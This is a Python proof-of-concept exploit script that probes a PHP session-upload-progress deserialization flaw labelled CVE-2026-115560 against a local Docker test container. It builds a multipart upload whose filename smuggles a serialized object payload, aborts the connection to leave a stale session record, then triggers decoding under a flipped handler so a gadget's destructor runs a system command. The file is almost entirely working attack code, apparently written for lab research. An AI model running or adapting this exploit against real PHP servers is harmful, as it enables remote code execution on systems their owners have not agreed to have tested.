#!/usr/bin/env python3
"""up2: CVE-2026-115560 probe #2 — ABANDONED upload-progress record.

1. raw-socket multipart POST to /target.php with PHP_SESSION_UPLOAD_PROGRESS,
   evil filename inside the file field; send HALF the file data then
   slam the socket shut (client abort) -> cleanup should not run,
   php_binary progress record should stay in /tmp/sess_<SID>.
2. dump the raw sess file via docker exec (no locks, no HTTP).
3. GET /gadget.php with same SID -> runtime flip to php handler,
   session_start decodes stale php_binary record AS php format ->
   if injection works, GadgetPwn object instantiates; its __destruct
   runs system("id") > /tmp/x_gadget.
4. check /tmp/x_gadget.
"""
import socket, subprocess, urllib.request, uuid, time

HOST, PORT = "127.0.0.1", 8086
SID = uuid.uuid4().hex
P = "probe2"
EVIL = b'x' * 200 + b'|O:9:"GadgetPwn":0:{}|'

def dump_sess():
    r = subprocess.run(["docker", "exec", "php_up", "cat", "/tmp/sess_" + SID],
                       capture_output=True, timeout=20)
    return r.stdout

def xg():
    r = subprocess.run(["docker", "exec", "php_up", "sh",
                        "-c", "cat /tmp/x_gadget 2>/dev/null || echo NO_XG"],
                       capture_output=True, timeout=20)
    return r.stdout.decode("latin1", "replace").strip()

print("SID", SID, flush=True)

# ---- stage A: aborted upload ----
pad = b"P" * 8192
body_head = (
    "------up2\r\n"
    "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
    + P + "\r\n"
    "------up2\r\n"
    "Content-Disposition: form-data; name=\"f\"; filename=\"" + EVIL.decode("latin1") + "\"\r\n"
    "Content-Type: application/octet-stream\r\n\r\n"
).encode("latin1")
body_tail = b"\r\n------up2--\r\n"
TOTAL = 4_000_000
req = (
    "POST /target.php HTTP/1.1\r\n"
    "Host: 127.0.0.1:8086\r\n"
    "Cookie: PHPSESSID=" + SID + "\r\n"
    "Content-Type: multipart/form-data; boundary=----up2\r\n"
    "Content-Length: " + str(len(body_head) + TOTAL + len(body_tail)) + "\r\n"
    "\r\n"
).encode()
s = socket.create_connection((HOST, PORT), timeout=30)
s.sendall(req + body_head)
sent = 0
while sent < TOTAL // 2:
    n = min(65536, TOTAL // 2 - sent)
    s.sendall(pad[:n]); sent += n
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
             b"\x01\x00\x00\x00\x00\x00\x00\x00")  # linger on, 0s = RST
s.close()  # ABORT
print("A: aborted after", sent, "body bytes", flush=True)
time.sleep(1)

raw = dump_sess()
print("A: sess file len", len(raw), flush=True)
if raw:
    print("A: sess b64", raw.hex()[:400], flush=True)
    print("A: sess latin1:", raw.decode("latin1", "replace")[:400], flush=True)
    print("A: contains payload marker:", b'GadgetPwn' in raw, flush=True)

# ---- stage B: victim decodes with flipped handler ----
rq = urllib.request.Request("http://127.0.0.1:8086/gadget.php",
                            headers={"Cookie": "PHPSESSID=" + SID})
try:
    with urllib.request.urlopen(rq, timeout=60) as r:
        print("B:", r.status, flush=True)
        print(r.read().decode("latin1", "replace"), flush=True)
except Exception as e:
    print("B: ERR", str(e)[:300], flush=True)

print("C: /tmp/x_gadget ->", xg(), flush=True)
